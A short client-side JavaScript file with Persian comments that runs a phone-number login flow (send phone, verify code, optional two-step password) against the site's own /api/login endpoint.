// script.js
let phoneCodeHash = ''; // برای ذخیره hash کد
let currentPhone = ''; // برای ذخیره شماره تلفن

document.getElementById("sendPhone").onclick = async () => {
  const phone = document.getElementById("phone").value;
  if (!phone) {
    document.getElementById("status").textContent = "لطفاً شماره تلفن را وارد کنید";
    return;
  }

  currentPhone = phone;
  document.getElementById("status").textContent = "در حال ارسال کد...";
  
  try {
    const res = await fetch("/api/login", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ step: "sendCode", phone })
    });
    
    const data = await res.json();
    document.getElementById("status").textContent = data.message;
    
    if (data.success) {
      phoneCodeHash = data.phoneCodeHash; // ذخیره hash برای مرحله بعد
      document.getElementById("codeSection").style.display = "block";
    }
  } catch (error) {
    document.getElementById("status").textContent = "خطا در ارتباط با سرور";
    console.error(error);
  }
};

document.getElementById("sendCode").onclick = async () => {
  const code = document.getElementById("code").value;
  
  if (!code) {
    document.getElementById("status").textContent = "لطفاً کد تأیید را وارد کنید";
    return;
  }

  document.getElementById("status").textContent = "در حال تأیید کد...";
  
  try {
    const res = await fetch("/api/login", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ 
        step: "verifyCode", 
        phone: currentPhone, 
        code,
        phoneCodeHash 
      })
    });
    
    const data = await res.json();
    document.getElementById("status").textContent = data.message;
    
    if (data.needPassword) {
      // اگر نیاز به رمز دومرحله‌ای باشد
      const password = prompt("لطفاً رمز دومرحله‌ای خود را وارد کنید:");
      if (password) {
        const resPwd = await fetch("/api/login", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ 
            step: "checkPassword", 
            phone: currentPhone, 
            password 
          })
        });
        
        const dataPwd = await resPwd.json();
        document.getElementById("status").textContent = dataPwd.message;
        
        if (dataPwd.success) {
          // در صورت موفقیت آمیز بودن ورود
          document.getElementById("codeSection").style.display = "none";
        }
      }
    } else if (data.success) {
      // در صورت موفقیت آمیز بودن ورود
      document.getElementById("codeSection").style.display = "none";
    }
  } catch (error) {
    document.getElementById("status").textContent = "خطا در ارتباط با سرور";
    console.error(error);
  }
};
